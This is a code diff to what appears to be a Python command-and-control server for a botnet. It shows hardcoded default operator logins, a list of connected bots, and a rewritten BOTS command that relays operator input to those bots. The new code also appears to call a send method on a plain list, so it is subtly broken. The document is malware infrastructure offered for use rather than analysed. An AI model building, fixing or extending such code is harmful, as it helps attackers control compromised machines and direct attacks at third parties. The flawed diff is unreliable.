@@ -4,7 +4,7 @@ from clients.banner import create_banner,create_HELP
 login = [['ROOT','ROOT'],['ADMIN','ADMIN'],['HEX','HEX']]
 
 def random_unique(length):
- return ''.join([random.choice(string.ascii_letters+string.digits+'_.-+=,:;|!@$%^&*()<>') for _ in range(length)])
+ return ''.join([random.choice(string.ascii_letters+string.digits+'_.-+=,:;|!@$%^&*()<>?/\\]}{[') for _ in range(length)])
 
 bots = []
 
@@ -109,8 +109,18 @@ def client_command(s,u):
       if not data:continue
       if com[0] in ['CLS','CLEAR']:s.send(b'\033[2J\033[H')
       elif com[0] == 'BOTS':
-        for a in bot_sent(com[1]):
-          s.sendall(a.encode()); s.sendall(b'\r\n\r\n')
+        length = []
+        total = 1
+        while True:
+          try:
+            length.append(com[total])
+            total += 1
+          except:break
+        c = bot_sent(' '.join(length))
+        for a in c:
+          s.sendall(a.encode())
+          if len(c) != 1:bots.sendall(b'\r\n\r\n')
+          else:pass
       elif com[0] == 'MENU':
         s.send(b'\033[2J\033[H')
         for a in create_banner("main",[time.ctime(),str(len(bots)),u]):s.send((a+'\r\n').encode()); time.sleep(0.1)
